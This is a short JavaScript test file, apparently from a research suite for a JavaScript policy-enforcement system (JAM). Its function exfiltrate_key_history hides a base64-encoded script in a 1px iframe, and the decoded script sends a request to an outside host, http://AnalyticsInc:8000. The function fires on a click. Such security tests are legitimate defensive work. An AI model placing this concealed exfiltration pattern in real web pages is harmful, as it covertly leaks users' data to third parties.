
JAM.startProfile('load');
function exfiltrate_key_history(){var data="PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNSIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=",URL="data:text/html;charset=utf-8;base64,"+data,data=document.createElement("iframe");data.src=URL;URL=data.style;URL.width="1px";URL=data.style;URL.height="1px";URL=document.getElementsByTagName("body");URL=URL[0];JAMScript.call(URL.appendChild,URL,[data])}
var v3=document.getElementById("test");JAMScript.set(v3,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
